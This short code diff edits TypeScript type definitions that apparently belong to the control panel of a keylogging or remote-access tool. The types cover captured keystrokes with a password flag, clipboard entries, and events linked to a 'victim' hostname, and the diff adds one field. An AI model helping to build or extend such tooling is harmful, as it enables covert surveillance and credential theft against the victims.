@@ -79,7 +79,7 @@ export type ClipboardEntry = {
 
 export type Keylog = { id: string; ts: string; process: string; title: string; text: string; password: boolean; count?: number };
 
-export type EventRow = { id: string; kind: string; data: Record<string, unknown>; createdAt: string; victim?: { id: string; hostname: string }; readAt: string | null };
+export type EventRow = { id: string; kind: string; data: Record<string, unknown>; legacy: string; createdAt: string; victim?: { id: string; hostname: string }; readAt: string | null };
 
 export type Notification = { id: string; kind: string; title: string; body: string; link: string | null; readAt: string | null; createdAt: string };
 
